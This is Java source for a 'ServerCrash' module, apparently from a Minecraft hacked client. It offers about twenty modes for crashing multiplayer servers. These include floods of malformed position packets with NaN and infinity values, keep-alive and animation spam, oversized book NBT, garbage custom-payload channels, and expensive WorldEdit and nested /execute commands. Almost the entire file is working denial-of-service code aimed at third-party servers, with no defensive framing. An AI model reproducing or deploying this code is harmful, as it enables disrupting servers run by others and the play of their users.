package Method.Client.module.misc;

import Method.Client.Main;
import Method.Client.managers.Setting;
import Method.Client.module.Category;
import Method.Client.module.Module;
import Method.Client.utils.TimerUtils;
import Method.Client.utils.system.Connection;
import Method.Client.utils.system.Wrapper;
import Method.Client.utils.visual.ChatUtils;
import io.netty.buffer.Unpooled;
import java.util.Random;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.login.client.CPacketEncryptionResponse;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCloseWindow;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketVehicleMove;
import net.minecraft.network.play.client.CPacketPlayer.Position;
import net.minecraft.network.play.client.CPacketPlayer.PositionRotation;
import net.minecraft.network.play.client.CPacketPlayerDigging.Action;
import net.minecraft.network.play.server.SPacketDisconnect;
import net.minecraft.network.play.server.SPacketJoinGame;
import net.minecraft.network.status.client.CPacketServerQuery;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.RandomUtils;

public class ServerCrash extends Module {
   Setting mode;
   Setting Packets;
   Setting AutoDisable;
   Setting JustOnce;
   public static boolean isModeMCBrandModifier;
   public static boolean disableSafeGuard;
   public long longdong;
   TimerUtils timer;

   public ServerCrash() {
      super("ServerCrash", 0, Category.MISC, "Server Crash");
      this.mode = Main.setmgr.add(new Setting("Mode", this, "Velt", new String[]{"Velt", "Infinity", "Artemis.ac", "Artemis.ac2", "LiquidBounce-BookFlood", "Operator", "WorldEdit", "WorldEdit2", "TabComplete", "ItemSwitcher", "KeepAlives", "Animation", "Payload", "NewFunction", "Hand", "Swap", "Riding", "Container", "Tp"}));
      this.Packets = Main.setmgr.add(new Setting("Packets", this, 5000.0D, 1.0D, 10000.0D, true));
      this.AutoDisable = Main.setmgr.add(new Setting("AutoDisable", this, false));
      this.JustOnce = Main.setmgr.add(new Setting("JustOnce", this, true));
      this.longdong = 0L;
      this.timer = new TimerUtils();
   }

   public void onDisable() {
      disableSafeGuard = false;
      isModeMCBrandModifier = false;
      this.longdong = 15000L;
   }

   public void onEnable() {
      ChatUtils.warning("This May - Will Crash You!");
      if (this.mode.getValString().equalsIgnoreCase("Payload")) {
         PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
         packetbuffer.writeLong(Long.MAX_VALUE);

         for(int i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|AdvCdm", packetbuffer));
         }
      }

      if (this.mode.getValString().equalsIgnoreCase("Artemis.ac")) {
         for(int i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive(0L));
         }
      } else if (this.mode.getValString().equalsIgnoreCase("Artemis.ac2")) {
         mc.field_71439_g.func_70634_a(mc.field_71439_g.field_70165_t, Double.NaN, mc.field_71439_g.field_70161_v);
      }

      this.longdong = 15000L;
   }

   public void onClientTick(ClientTickEvent event) {
      disableSafeGuard = true;
      new PacketBuffer(Unpooled.buffer().writeByte(Integer.MAX_VALUE));
      int i;
      if (this.mode.getValString().equalsIgnoreCase("Container")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketClickWindow(Integer.MIN_VALUE, Integer.MIN_VALUE, Integer.MIN_VALUE, ClickType.CLONE, (ItemStack)null, (short)1));
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketClickWindow(Integer.MAX_VALUE, Integer.MAX_VALUE, 1, ClickType.CLONE, ItemStack.field_190927_a, (short)1));
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketCloseWindow(Integer.MIN_VALUE));
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketCloseWindow(Integer.MAX_VALUE));
         }
      }

      double rand1;
      double rand2;
      int packets;
      if (this.mode.getValString().equalsIgnoreCase("Tp")) {
         Wrapper.INSTANCE.sendPacket(new Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
         rand1 = 0.0D;
         rand2 = 0.0D;

         for(packets = 0; (double)packets < this.Packets.getValDouble(); ++packets) {
            rand1 = (double)(packets * 9);
            Wrapper.INSTANCE.sendPacket(new Position(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u + rand1, mc.field_71439_g.field_70161_v, (new Random()).nextBoolean()));
         }

         for(packets = 0; (double)packets < this.Packets.getValDouble() * 10.0D; ++packets) {
            rand2 = (double)(packets * 9);
            Wrapper.INSTANCE.sendPacket(new Position(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u + rand1, mc.field_71439_g.field_70161_v + rand2, (new Random()).nextBoolean()));
         }
      }

      if (this.mode.getValString().equalsIgnoreCase("Hand")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketAnimation(EnumHand.MAIN_HAND));
         }
      }

      if (this.mode.getValString().equalsIgnoreCase("Swap")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketPlayerDigging(Action.SWAP_HELD_ITEMS, BlockPos.field_177992_a, mc.field_71439_g.func_174811_aO()));
         }
      }

      if (this.mode.getValString().equalsIgnoreCase("Riding")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Entity riding = mc.field_71439_g.func_184187_bx();
            if (riding != null) {
               riding.field_70165_t = mc.field_71439_g.field_70165_t;
               riding.field_70163_u = mc.field_71439_g.field_70163_u + 1337.0D;
               riding.field_70161_v = mc.field_71439_g.field_70161_v;
               mc.field_71439_g.field_71174_a.func_147297_a(new CPacketVehicleMove(riding));
            }
         }
      }

      if (this.mode.getValString().equalsIgnoreCase("Artemis.ac2")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Wrapper.INSTANCE.sendPacket(new PositionRotation(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, (new Random()).nextBoolean()));
         }
      } else if (this.mode.getValString().equalsIgnoreCase("Artemis.ac")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive(0L));
         }
      } else if (this.mode.getValString().equalsIgnoreCase("NewFunction")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Wrapper.INSTANCE.sendPacket(new CPacketEncryptionResponse());
            Wrapper.INSTANCE.sendPacket(new CPacketServerQuery());
         }
      } else if (this.mode.getValString().equalsIgnoreCase("Infinity")) {
         Wrapper.INSTANCE.sendPacket(new Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
         Wrapper.INSTANCE.sendPacket(new Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
      } else if (this.mode.getValString().equalsIgnoreCase("Velt")) {
         if (mc.field_71439_g.field_70173_aa < 100) {
            for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
               Wrapper.INSTANCE.sendPacket(new Position(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u - 1.0D, mc.field_71439_g.field_70161_v, false));
               Wrapper.INSTANCE.sendPacket(new Position(mc.field_71439_g.field_70165_t, Double.MAX_VALUE, mc.field_71439_g.field_70161_v, false));
               Wrapper.INSTANCE.sendPacket(new Position(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u - 1.0D, mc.field_71439_g.field_70161_v, false));
            }
         }
      } else if (this.mode.getValString().equalsIgnoreCase("LiquidBounce-BookFlood")) {
         String randomString = RandomStringUtils.random(8, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ");
         ItemStack bookStack = new ItemStack(Items.field_151099_bA);
         NBTTagCompound bookCompound = new NBTTagCompound();
         bookCompound.func_74778_a("author", "FileExtension");
         bookCompound.func_74778_a("title", "Â§8Â§l[Â§dÂ§lServerCrasherÂ§8Â§l]");
         NBTTagList pageList = new NBTTagList();

         for(packets = 0; packets < 50; ++packets) {
            pageList.func_74742_a(new NBTTagString(randomString));
         }

         bookCompound.func_74782_a("pages", pageList);
         bookStack.func_77982_d(bookCompound);

         for(packets = 0; (double)packets < this.Packets.getValDouble(); ++packets) {
            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.func_150788_a(bookStack);
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
         }
      }

      int r;
      double rand3;
      if (this.mode.getValString().equalsIgnoreCase("FlexAir")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            rand1 = RandomUtils.nextDouble(0.1D, 1.9D);
            rand2 = RandomUtils.nextDouble(0.1D, 1.9D);
            rand3 = RandomUtils.nextDouble(0.1D, 1.9D);
            r = RandomUtils.nextInt(0, Integer.MAX_VALUE);
            Wrapper.INSTANCE.sendPacket(new PositionRotation(mc.field_71439_g.field_70165_t + 1257892.0D * rand1, mc.field_71439_g.field_70163_u + 9871521.0D * rand2, mc.field_71439_g.field_70161_v + 9081259.0D * rand3, mc.field_71439_g.field_70177_z, mc.field_71439_g.field_70125_A, (new Random()).nextBoolean()));
            Wrapper.INSTANCE.sendPacket(new PositionRotation(mc.field_71439_g.field_70165_t - 9125152.0D * rand1, mc.field_71439_g.field_70163_u - 1287664.0D * rand2, mc.field_71439_g.field_70161_v - 4582135.0D * rand3, mc.field_71439_g.field_70177_z, mc.field_71439_g.field_70125_A, (new Random()).nextBoolean()));
            Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive((long)r));
         }
      } else if (this.mode.getValString().equalsIgnoreCase("TabComplete")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            rand1 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
            rand2 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
            rand3 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
            ChatUtils.error("This feature is temporarily disabled");
         }
      } else if (this.mode.getValString().equalsIgnoreCase("WorldEdit")) {
         if (mc.field_71439_g.field_70173_aa % 2 == 0) {
            mc.field_71439_g.func_71165_d("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            mc.field_71439_g.func_71165_d("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            mc.field_71439_g.func_71165_d("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            mc.field_71439_g.func_71165_d("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            mc.field_71439_g.func_71165_d("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
         }
      } else if (this.mode.getValString().equalsIgnoreCase("DEV")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
            Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).func_180714_a("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
         }
      } else if (this.mode.getValString().equalsIgnoreCase("Operator")) {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            mc.field_71439_g.func_71165_d("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager");
         }
      } else if (this.mode.getValString().equalsIgnoreCase("MC|BrandModifier")) {
         isModeMCBrandModifier = true;
      } else if (!this.mode.getValString().equalsIgnoreCase("ItemSwitcher")) {
         if (this.mode.getValString().equalsIgnoreCase("KitmapSignInteract")) {
            for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
               mc.func_147121_ag();
               Wrapper.INSTANCE.sendPacket(new CPacketPlayerDigging(Action.DROP_ALL_ITEMS, new BlockPos(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u, mc.field_71439_g.field_70161_v), EnumFacing.UP));
            }
         } else if (this.mode.getValString().equalsIgnoreCase("WorldEdit2")) {
            for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
               Wrapper.INSTANCE.sendPacket(new CPacketCustomPayload("WECUI", (new PacketBuffer(Unpooled.buffer())).func_180714_a("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")));
            }
         } else if (this.mode.getValString().equalsIgnoreCase("KeepAlives")) {
            for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
               r = RandomUtils.nextInt(0, 0);
               Wrapper.INSTANCE.sendPacket(new CPacketKeepAlive((long)r));
            }
         } else if (this.mode.getValString().equalsIgnoreCase("Animation")) {
            for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
               mc.field_71439_g.field_71174_a.func_147297_a(new CPacketAnimation());
            }
         }
      } else {
         for(i = 0; (double)i < this.Packets.getValDouble(); ++i) {
            for(r = 0; r < 8; ++r) {
               Wrapper.INSTANCE.sendPacket(new CPacketHeldItemChange(r));
            }
         }
      }

      if (this.timer.hasReached((float)this.longdong) && this.AutoDisable.getValBoolean()) {
         this.setToggled(false);
         this.timer.reset();
      }

      if (this.JustOnce.getValBoolean() && !this.mode.getValString().equalsIgnoreCase("MC|BrandModifier")) {
         this.setToggled(false);
      }

   }

   public boolean onPacket(Object packet, Connection.Side side) {
      if (this.mode.getValString().equalsIgnoreCase("MC|BrandModifier") && packet instanceof CPacketCustomPayload) {
         CPacketCustomPayload C17 = (CPacketCustomPayload)packet;
         C17.field_149562_a = "MC|Brand";
         C17.field_149561_c = (new PacketBuffer(Unpooled.buffer())).func_180714_a("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
      }

      if (this.timer.hasReached((float)this.longdong) && this.AutoDisable.getValBoolean()) {
         if (packet instanceof SPacketJoinGame) {
            this.setToggled(false);
         }

         if (packet instanceof SPacketDisconnect) {
            this.setToggled(false);
         }
      }

      return true;
   }
}
